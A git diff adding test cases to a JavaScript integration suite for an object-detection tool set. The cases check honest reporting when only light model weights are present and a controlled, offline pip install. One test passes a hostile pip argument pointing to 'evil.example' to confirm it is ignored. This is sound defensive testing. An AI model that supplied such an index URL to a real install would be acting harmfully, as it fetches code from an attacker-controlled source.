@@ -107,6 +107,61 @@ async function settle(fx, mediaId, ms = 240000) {
   } finally { await fx2.dispose(); fs.rmSync(empty, { recursive: true, force: true }); }
 }
 
+// ======================================================================= 1b. 只有 light 的权重(full 缺 Grounding DINO):提示词不生效,如实说
+{
+  const lightOnly = fs.mkdtempSync(path.join(outDir, 'models-light-'));
+  for (const name of ['yunet.onnx', 'rtdetr_r18vd.onnx']) {
+    const from = path.join(MODELS, name);
+    try { fs.linkSync(from, path.join(lightOnly, name)); } catch { fs.copyFileSync(from, path.join(lightOnly, name)); }
+  }
+  const fx = await makeP4Fixture(null, { config: baseConfig(PYTHON, lightOnly) });
+  try {
+    await fx.addMedia({ id: 'person', bytes: fs.readFileSync(personMp4), extra: { duration: 4 } });
+    const status = await fx.tools.call('subject_status', {}, fx.context);
+    console.log('  light 权重齐、DINO 缺 subject_status =', JSON.stringify({ engine: status.engine, full: status.detail?.full }));
+    check('full 缺权重:engine=light,full.ready=false 并点名 dino 不在', status.engine === 'light' && status.detail.full.ready === false && status.detail.full.models.dino.exists === false);
+    const started = await detect(fx, 'person', { times: [1, 2], prompt: 'cat . dog .' });
+    check('带提示词也只能跑 light,detect 回的 engine 是 light', started.engine === 'light');
+    const { result, error } = await settle(fx, 'person');
+    console.log('  light + 提示词 =', JSON.stringify({ engine: result?.engine, prompt: result?.prompt, labels: [...new Set(result?.samples?.flatMap((s) => s.boxes.map((b) => b.label)))], note: result?.engineNote }));
+    check('light 不假称提示词生效:label 只有 person/face,提示词原样回显,engineNote 说明', !error && result.engine === 'light' && result.prompt === 'cat . dog .'
+      && result.samples.every((s) => s.boxes.every((b) => ['person', 'face'].includes(b.label))) && /提示词不生效/.test(result.engineNote));
+    const again = await detect(fx, 'person', { prompt: 'cat . dog .' });
+    check('同样的提示词再问:复用,并说明这台机器只有 light 所以没重测', again.reused === true && /只能跑 light/.test(again.engineNote ?? ''));
+  } finally { await fx.dispose(); fs.rmSync(lightOnly, { recursive: true, force: true }); }
+}
+
+// ======================================================================= 1c. subject_install:受控安装,真 pip(不连网)
+{
+  const work = fs.mkdtempSync(path.join(outDir, 'install-'));
+  const pylibs = path.join(work, 'libs');
+  const okReq = path.join(work, 'empty.txt');
+  const badReq = path.join(work, 'bad.txt');
+  fs.writeFileSync(okReq, '# 空清单:真 pip 跑一遍,什么都不用装\n');
+  fs.writeFileSync(badReq, 'onnxruntime==99.0\n');
+  const models = fs.mkdtempSync(path.join(work, 'models-'));
+  const withReq = (requirements) => ({ ...baseConfig(PLAIN_PYTHON, models), install: { pylibs, requirements } });
+  let fx = await makeP4Fixture(null, { config: withReq(okReq) });
+  try {
+    const started = await fx.tools.call('subject_install', { tier: 'full', pip: '--index-url http://evil.example/' }, fx.context);
+    check('subject_install 起受控作业(模型给的 tier / pip 参数不起作用)', started.started === true);
+    let row;
+    for (let i = 0; i < 400; i++) { row = await fx.jobs.get(fx.context, started.jobId); if (['done', 'error'].includes(row.state)) break; await sleep(150); }
+    const status = await fx.tools.call('subject_status', {}, fx.context);
+    console.log('  真 pip 空清单 =', JSON.stringify({ state: row.state, install: status.install, engine: status.engine }));
+    check('真 pip:作业 done,subject_status 带 install 摘要;依赖其实没装,engine 仍是 null(不假称装好)', row.state === 'done' && status.install?.state === 'done' && status.engine === null);
+  } finally { await fx.dispose(); }
+  fx = await makeP4Fixture(null, { config: withReq(badReq) });
+  try {
+    const started = await fx.tools.call('subject_install', {}, fx.context);
+    let row;
+    for (let i = 0; i < 400; i++) { row = await fx.jobs.get(fx.context, started.jobId); if (['done', 'error'].includes(row.state)) break; await sleep(150); }
+    const status = await fx.tools.call('subject_status', {}, fx.context);
+    console.log('  真 pip 找不到包 =', JSON.stringify({ state: row.state, errorCode: row.errorCode, message: status.install?.message }));
+    check('真 pip 失败:作业 error,原因是 pip 的话(没网/找不到),不带节点路径', row.state === 'error' && row.errorCode === 'SUBJECT_INSTALL_FAILED' && /pip|安装|requirement/i.test(status.install?.message ?? '') && !String(status.install?.message).includes(work));
+  } finally { await fx.dispose(); fs.rmSync(work, { recursive: true, force: true }); }
+}
+
 // ======================================================================= 2. 真视频、真结果(light / full)
 {
   const fx = await makeP4Fixture(null, { config: baseConfig(PYTHON, MODELS) });
